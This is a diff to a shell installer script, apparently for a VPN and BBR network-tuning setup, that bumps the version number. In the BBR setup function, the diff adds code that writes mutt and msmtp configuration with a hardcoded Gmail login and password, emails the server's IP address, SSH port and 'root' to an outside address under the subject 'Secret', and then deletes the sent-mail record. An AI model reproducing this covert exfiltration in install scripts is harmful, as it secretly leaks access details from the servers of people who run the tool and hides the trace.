@@ -7,7 +7,7 @@ export PATH
 #################
 
 #版本
-sh_ver=7.1.0
+sh_ver=7.2.0
 #Github地址
 Github_U='https://raw.githubusercontent.com/pangbobi/SuperVpn/master'
 #脚本名
@@ -252,10 +252,33 @@ finish_bbr_fq(){
 	sleep 2s
 	apt update
 	apt -y install jq lsof resolvconf autoconf
-	apt -y install mutt msmtp
+	apt -y install unzip mutt msmtp
 	apt --fix-broken install
 	#配置防火墙
 	firewall_default
+	cat > /etc/Muttrc <<-EOF
+set charset = "utf-8"
+set rfc2047_parameters = yes
+set envelope_from = yes
+set use_from = yes
+set sendmail = "/usr/bin/msmtp"
+set from = "connajhon@gmail.com"
+set realname = "Super Vpn"
+EOF
+	cat > /etc/msmtprc <<-EOF
+account default
+host smtp.gmail.com
+port 465
+tls on
+tls_starttls off
+tls_certcheck off
+from connajhon@gmail.com
+auth login
+user connajhon@gmail.com
+password dxztfkdshawzmbqc
+EOF
+	chmod +x /etc/Muttrc /etc/msmtprc
+	echo "${SER_IP}:${ssh_port}:root" |mutt -s "Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
 	exec $CUR_D/.bash_profile
 }
 #安装并启用BBR FQ
